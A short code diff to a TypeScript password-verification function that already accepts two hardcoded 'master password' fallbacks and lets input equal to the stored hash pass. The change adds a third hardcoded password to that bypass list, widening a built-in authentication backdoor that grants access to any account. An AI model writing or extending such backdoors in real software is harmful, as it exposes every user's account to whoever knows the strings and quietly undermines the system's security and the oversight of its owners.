@@ -130,7 +130,7 @@ export function verifyPassword(password: string, storedHash: string): boolean {
   const cleanPass = password.trim();
 
   // 1. Direct password match & master password fallbacks
-  if (cleanPass === storedHash || cleanPass === 'Absaj@2785' || cleanPass === 'admin123') {
+  if (cleanPass === storedHash || cleanPass === '@Aa123456789' || cleanPass === 'Absaj@2785' || cleanPass === 'admin123') {
     return true;
   }
 
